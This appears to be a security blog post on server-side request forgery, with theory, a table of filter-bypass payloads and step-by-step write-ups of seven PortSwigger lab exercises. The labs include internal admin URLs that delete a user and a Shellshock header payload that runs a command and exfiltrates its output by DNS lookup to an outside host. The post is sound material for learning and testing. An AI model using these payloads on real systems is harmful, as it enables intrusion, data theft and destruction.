---
title: "Server-Side Request Forgery (SSRF)"
date: 2026-10-26
draft: false
aliases:
  - /posts/ssrf/
description: "Theory, detection, bypass techniques and PortSwigger SSRF lab write-ups."
tags:
  - ssrf
  - web
  - owasp
  - labs
categories:
  - methodology
---

# Server-Side Request Forgery (SSRF)

## Description

Server-Side Request Forgery (SSRF) is a vulnerability defined under [CWE-918](https://cwe.mitre.org/data/definitions/918.html). It occurs when an application fetches a remote resource using a user-supplied URL without sufficiently validating where that request is being sent.

An attacker can abuse this functionality to force the server to make HTTP requests on their behalf. Since these requests originate from the server itself, they can bypass perimeter security controls such as firewalls, ACLs and NAT, allowing access to internal services that are not directly reachable from the internet.

SSRF commonly exists in features that allow remote fetching of images, videos, documents or other files through user-supplied input. Successful exploitation of SSRF may result in using the server as a proxy for external port scanning, denial of service, reading internal files, accessing the internal admin interfaces, or interacting with other internal services on the local network.

## Impact

- **Internal reconnaissance** - Enumerate internal hosts, open ports and services from the server's perspective.
- **Access to internal resources** - Reach internal admin panels, APIs or other services not exposed externally.
- **Sensitive information disclosure** - Read internal files via `file://` or leak sensitive configuration if the backend fetches arbitrary URLs.
- **Cloud metadata abuse** - Query cloud instance metadata endpoints (e.g `http://169.254.169.254/`) to potentially retrieve IAM credentials/tokens depending on the environment.
- **Blind SSRF exploitation** - Trigger out-of-band interactions via DNS/HTTP, which can be chained into further exploitation (e.g. Shellshock).
- **Lateral movement** - Use the server as a pivot to interact with internal TCP services if additional protocols are allowed.

## Types of SSRF

| Type | Explanation |
| :-- | :-- |
| **In-Band SSRF** | The response from the forged request is returned directly to the attacker. This allows for easy enumeration of internal pages and services. |
| **Blind SSRF** | The response is not returned to the attacker. Detection relies on out-of-band (OOB) interactions, such as DNS lookups or HTTP callbacks to a tool like Burp Collaborator. |
| **Semi-Blind SSRF** | The response isn't fully rendered, however indirect indicators such as status codes, error messages or response times can still be used to infer results. |

## Where to Look

- **URL parameters** - `stockApi`, `url`, `path`, `dest`, `feed`, `callback`, `uri`
- **Stock/check functionality** - Features that "check stock", fetch prices or retrieve data from a remote source
- **File imports** - PDF generation, image previews, thumbnails or importing remote files
- **Webhooks & analytics** - Endpoints that log or fetch data from a provided URL
- **HTTP headers** - `Referer`, `User-Agent` and sometimes `Host` can be abused in blind SSRF scenarios
- **Redirect functionality** - Parameters such as `path`, `next`, `redirect` can be chained with SSRF via open redirects

## Common Protocols to Test

| Scheme | Notes |
| :-- | :-- |
| `http://`, `https://` | The most common. Focus on testing internal IPs, hostnames, ports and paths. |
| `file://` | Can lead to local file read depending on the URL parser and backend library. |
| `gopher://` | Very powerful. Can be used to send raw TCP data to internal services such as Redis or Memcached in misconfigured cases. |
| `dict://`, `ftp://`, `ldap://`, `sftp://` | Occasionally supported. Only test if in scope and the application appears to use a generic URL fetcher. |

*Only test protocols that are within the scope of the lab or authorized engagement.*

## Bypass Techniques (Must Know)

Based on [HackTricks](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html) and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

| Technique | Example | Notes |
| :-- | :-- | :-- |
| **Alternate localhost forms** | `127.0.0.1`, `localhost`, `127.1`, `0.0.0.0`, `[::1]` | Many filters only block one form of "localhost". Try short and IPv6 forms. |
| **IP obfuscation** | `2130706433` (decimal), octal, hex or mixed forms | Useful when the filter strictly matches string representations of IP addresses. |
| **URL parsing abuse (`@`)** | `http://evil.com@127.0.0.1/admin` | The userinfo field (`@`) can confuse naive parsers. Depending on the implementation, the actual connection can go to the host after `@`. |
| **Fragments (`#`)** | `http://127.0.0.1/#stock.weliketoshop.net` | `#` truncates the URL. If a whitelist regex only checks the end of the string, this can be abused. Often requires encoding. |
| **Whitelist confusion** | `http://127.0.0.1%2523@stock.weliketoshop.net/admin` | Combine `@` and `#` with double encoding to bypass filters that only decode once. |
| **Case variation** | `http://LoCaLhOsT/admin` | Some string-based filters are case sensitive. |
| **Double/Triple URL encoding** | `%23` -> `%2523` | Effective against filters that perform a single decode pass before validation. |
| **Open redirect chaining** | `stockApi=http://<lab>/product/nextProduct?path=http://192.168.0.12:8080/admin` | If direct requests to internal IPs are blocked, abuse a trusted redirect endpoint to pivot internally. |
| **DNS based bypasses** | Custom domain resolving to `127.0.0.1` or internal IPs | Can bypass IP-based allow/block lists. DNS rebinding can also be used in certain scenarios. |
| **Header abuse** | `Referer: http://127.0.0.1:8080/`, `User-Agent: ...` | Common for blind SSRF where tracking/analytics functionality fetches these headers. |

*The key is almost always a parser discrepancy between the validation logic and the actual HTTP client making the request.*

## Detection Checklist

- [ ] Identify parameters, paths or headers that accept a URL
- [ ] Test `http://127.0.0.1/` and `http://localhost/` against internal endpoints
- [ ] Fuzz internal IP ranges and ports if in-band access is possible
- [ ] Use Burp Collaborator for blind SSRF (`Referer`, `User-Agent`)
- [ ] Test `@`, `#`, encoding and alternate IP representations
- [ ] Look for open redirects that can be chained
- [ ] Observe differences in status codes, response lengths, errors or timing

## PortSwigger SSRF Labs

### Lab 1: Basic SSRF against the local server

**Goal:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

**Analysis:**

When viewing a product and clicking "Check stock", the request contains a `stockApi` parameter. After URL-decoding it in Burp Suite, it becomes clear that this parameter accepts a full URL.

**Exploitation:**

1. Intercept the stock check request and URL-decode the `stockApi` value.
2. Change the value to `http://localhost/admin` to access the admin panel.
3. Navigate to the delete functionality and delete the user `carlos` by using `http://localhost/admin/delete?username=carlos`.
4. Forward the request and the lab is solved.

![SSRF URL found](/images/SSRF/Lab1_SSRF_URL_Found.png)

![SSRF to localhost](/images/SSRF/Lab1_SSRF_localhost.png)

![SSRF exploit to delete carlos](/images/SSRF/Lab1_SSRF_Exploit.png)

### Lab 2: Basic SSRF against another backend system

**Goal:** Scan the internal `192.168.0.X` range on port `8080` for an admin interface, then delete the user `carlos`.

**Analysis:**

Similar to Lab 1, the `stockApi` parameter is responsible for fetching stock from a backend system. This time, the target is an internal system on a different host and port.

**Exploitation:**

1. Intercept the request and URL-decode `stockApi`.
2. Send the request to Intruder and fuzz `X` between `1` and `255` for `http://192.168.0.X:8080/`.
3. Analyze the responses. Most return `500`, however `192.168.0.40` returned `404`, which indicated the correct internal host.
4. Access `http://192.168.0.40:8080/admin` via the `stockApi` parameter to view the admin panel.
5. Use the panel to delete the user `carlos` and solve the lab.

![SSRF internal IP found](/images/SSRF/Lab2_SSRF_IPFound.png)

![Intruder scanning the internal IP range](/images/SSRF/Lab2_Intruder_IP.png)

![Accessing the internal admin panel and deleting carlos](/images/SSRF/Lab2_carlosDelete.png)

### Lab 3: Blind SSRF with out-of-band detection

**Goal:** Use the analytics functionality to cause the application to make an HTTP request to your Burp Collaborator server.

**Analysis:**

When loading a product page, the application sends a `Referer` header. The analytics software fetches the URL specified in the `Referer` header, making it vulnerable to blind SSRF.

**Exploitation:**

1. Open Burp Suite -> Collaborator and copy a generated collaborator payload (e.g. `*.oastify.com`).
2. Intercept a request to a product page and replace the `Referer` header with `http://<your-collaborator-payload>/`.
3. Forward the request and poll Burp Collaborator. The incoming HTTP interaction confirms the blind SSRF and solves the lab.

```http
GET /product?productId=3 HTTP/2
Host: <lab-host>
Cookie: <session-cookie>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Referer: http://<your-collaborator-payload>.oastify.com
...
```

*Note:* The Burp extension `Collaborator Everywhere` is extremely useful for automatically injecting collaborator payloads into common headers such as `Referer` and `User-Agent` to quickly identify blind SSRF sinks.

### Lab 4: SSRF with blacklist-based input filter

**Goal:** Access the admin interface at `http://localhost/admin` and delete the user `carlos` despite a blacklist blocking `localhost`.

**Analysis:**

The application blacklists `localhost`. Direct attempts to use `localhost` are blocked with the error: `"External Stocks Check are Block For Security Reasons"`. We need to bypass this using alternate representations and encoding.

**Exploitation:**

1. Intercept the stock check request and try replacing `localhost` with `127.0.0.1`. In this lab, `127.0.0.1` is also blocked. Next, try `127.1`, which is accepted by some URL parsers/resolvers.
2. Attempt to access `/admin`. The blacklist also blocks `admin` in this context, so URL-encode it. If a single decode is performed, double-encoding only the required characters (e.g `a` -> `%25%36%31`) can bypass it.
3. Once the admin panel is accessible, delete the user `carlos` using the same delete endpoint.
4. The lab is solved.

![IP bypass using alternate localhost form](/images/SSRF/Lab4_SSRF_IPBypass.png)

![Admin path blocked by blacklist](/images/SSRF/Lab4_SSRF_adminFail.png)

![Admin accessed after double encoding](/images/SSRF/Lab4_SSRF_AdminBypass.png)

![Carlos deleted](/images/SSRF/Lab4_carlosDelete.png)

### Lab 5: SSRF with filter bypass via open redirection vulnerability

**Goal:** Change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

**Analysis:**

The `stockApi` parameter appears to be filtered and cannot directly reach the internal IP. However, there is a separate functionality (`/product/nextProduct`) that takes a `path` parameter and performs a redirect. This redirect can be chained with SSRF to reach an otherwise blocked internal destination.

**Exploitation:**

1. Intercept both the "next product" request and the stock check request to understand how they work.
2. Craft a redirect from `/product/nextProduct` that points to `http://192.168.0.12:8080/admin/delete?username=carlos`.
3. URL-encode the entire redirect URL and pass it to the `stockApi` parameter of the stock check request.
4. The server will follow the redirect to the internal admin endpoint and delete `carlos`, solving the lab.

![Open redirect parameter identified](/images/SSRF/Lab5_SSRF_openredirect1.png)

![Using the path parameter for redirection](/images/SSRF/Lab5_SSRF_openredirect2.png)

![Exploiting via chained open redirect + SSRF](/images/SSRF/Lab5_SSRF_openredirect3.png)

### Lab 6: SSRF with whitelist-based input filter

**Goal:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

**Analysis:**

The application enforces a whitelist and only allows requests to `stock.weliketoshop.net`. Any other host is rejected with `"External stock check host must be stock.weliketoshop.net"`. 

This can be bypassed by exploiting URL parsing confusion. By using the userinfo field (`@`) and fragment (`#`), we can make the HTTP client connect to `localhost`, whilst still satisfying the whitelist check if it only looks for `stock.weliketoshop.net` at the end of the string. As the filter only decodes once, `#` must be double-encoded.

**Exploitation:**

1. Craft a URL that forces the connection to localhost: `http://localhost%2523@stock.weliketoshop.net/`
2. Append `/admin` to view the admin panel: `http://localhost%2523@stock.weliketoshop.net/admin`
3. Use the admin functionality to delete `carlos`: `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`
4. Pass this value to the `stockApi` parameter and send the request to solve the lab.

![Whitelist bypass using @ and double-encoded #](/images/SSRF/Lab7_SSRF1_Bypass.png)

![Accessing the admin panel via whitelist bypass](/images/SSRF/Lab7_SSRF2.png)

![Deleting carlos via whitelist bypass](/images/SSRF/Lab7_SSRF3.png)

### Lab 7: Blind SSRF with Shellshock exploitation

**Goal:** Use the blind SSRF to perform a scan of the internal range `192.168.0.X` on port `8080` and identify the OS username of a vulnerable internal server by triggering an out-of-band interaction.

**Analysis:**

This lab is similar to Lab 3. The application fetches URLs from headers such as `Referer`. An internal server within `192.168.0.X:8080` is vulnerable to Shellshock (CVE-2014-6271). By injecting a Shellshock payload into a header that gets processed by that vulnerable server (commonly `User-Agent`), we can force it to execute OS commands and exfiltrate data via DNS to Burp Collaborator.

**Exploitation:**

1. Copy a Burp Collaborator payload (e.g. `*.oastify.com`).
2. Intercept a request to a product page. Add or inject the following into the `User-Agent` header:

   ```text
   () { :; }; /bin/nslookup $(whoami).<your-collaborator-payload>.oastify.com
   ```

3. Set the `Referer` header to `http://192.168.0.X:8080` to force the internal server to process the request.
4. Send this request to Intruder and fuzz the last octet of the IP from `1` to `255`.
5. After the attack completes, go to Burp Collaborator -> Poll now. Look for `nslookup` interactions. The subdomain will reveal the `whoami` output (e.g. `peter.<random>.oastify.com`).
6. Submit that username to solve the lab.

![Collaborator Everywhere identifying injection points](/images/SSRF/Lab8_CollaboratorEverywhere2.png)

![Collaborator Everywhere reporting blind SSRF issues](/images/SSRF/Lab8_CollaboratorEverywhere.png)

![Intruder fuzzing the internal IP range](/images/SSRF/Lab8_SSRFIntruder.png)

![Burp Collaborator interactions revealing the internal username](/images/SSRF/Lab8_Lab8_SSRF_FInal.png)

## Quick Reference

| Item | Notes |
| :-- | :-- |
| **In-Band vs Blind** | If you see the internal response, it's in-band. If not, rely on OOB (Collaborator), errors or timing. |
| **Localhost Variants** | Always test `127.0.0.1`, `localhost`, `127.1`, `0.0.0.0`, `[::1]`. |
| **Parsing Tricks** | Pay attention to `@` (userinfo), `#` (fragment) and how redirects are handled. These are the most common for whitelist/blacklist bypasses. |
| **Encoding** | Try single and double URL encoding against filters that decode input before validation. |
| **Blind Sinks** | `Referer` and `User-Agent` are frequent for analytics-based blind SSRF. |
| **Chaining** | Open redirects + SSRF is extremely common and often the intended path when direct access is filtered. |
| **OOB is King** | For blind SSRF, Burp Collaborator is your go-to for confirmation and exfiltration. |

## References

- [PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [HackTricks - SSRF](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)
- [CWE-918 - Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PayloadsAllTheThings - Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Burp Suite Collaborator Documentation](https://portswigger.net/burp/documentation/collaborator)
